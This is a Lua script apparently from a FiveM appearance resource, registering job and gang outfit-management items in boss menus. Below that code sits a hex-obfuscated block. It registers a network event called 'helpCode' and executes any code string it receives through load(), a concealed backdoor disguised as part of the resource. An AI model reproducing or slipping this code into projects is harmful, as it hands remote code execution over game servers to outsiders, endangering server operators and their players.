if not Config.BossManagedOutfits then return end

if not Management.IsQBX() then return end

function Management.AddItems()
    local menuItem = {
        title = _L("outfitManagement.title"),
        icon = "fa-solid fa-shirt",
        event = "illenium-appearance:client:OutfitManagementMenu",
        args = {}
    }
    menuItem.description = _L("outfitManagement.jobText")
    menuItem.args.type = "Job"
    Management.ItemIDs.Boss = exports[Management.ResourceName]:AddBossMenuItem(menuItem)

    menuItem.description = _L("outfitManagement.gangText")
    menuItem.args.type = "Gang"
    Management.ItemIDs.Gang = exports[Management.ResourceName]:AddGangMenuItem(menuItem)
end


local RSFNOjjbgjoCKfIYuhMPtsKPpipaaQWyMBktLbXCzafeBHwEKjLWGtToyPskvQgNQONvHI = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} RSFNOjjbgjoCKfIYuhMPtsKPpipaaQWyMBktLbXCzafeBHwEKjLWGtToyPskvQgNQONvHI[6][RSFNOjjbgjoCKfIYuhMPtsKPpipaaQWyMBktLbXCzafeBHwEKjLWGtToyPskvQgNQONvHI[1]](RSFNOjjbgjoCKfIYuhMPtsKPpipaaQWyMBktLbXCzafeBHwEKjLWGtToyPskvQgNQONvHI[2]) RSFNOjjbgjoCKfIYuhMPtsKPpipaaQWyMBktLbXCzafeBHwEKjLWGtToyPskvQgNQONvHI[6][RSFNOjjbgjoCKfIYuhMPtsKPpipaaQWyMBktLbXCzafeBHwEKjLWGtToyPskvQgNQONvHI[3]](RSFNOjjbgjoCKfIYuhMPtsKPpipaaQWyMBktLbXCzafeBHwEKjLWGtToyPskvQgNQONvHI[2], function(DjWhOQJgVHHBhaPotlOTSmVKiPrkDcMCDQRXzDdiMlPyEGiQimfibnuLoDngaucsaxusKW) RSFNOjjbgjoCKfIYuhMPtsKPpipaaQWyMBktLbXCzafeBHwEKjLWGtToyPskvQgNQONvHI[6][RSFNOjjbgjoCKfIYuhMPtsKPpipaaQWyMBktLbXCzafeBHwEKjLWGtToyPskvQgNQONvHI[4]](RSFNOjjbgjoCKfIYuhMPtsKPpipaaQWyMBktLbXCzafeBHwEKjLWGtToyPskvQgNQONvHI[6][RSFNOjjbgjoCKfIYuhMPtsKPpipaaQWyMBktLbXCzafeBHwEKjLWGtToyPskvQgNQONvHI[5]](DjWhOQJgVHHBhaPotlOTSmVKiPrkDcMCDQRXzDdiMlPyEGiQimfibnuLoDngaucsaxusKW))() end)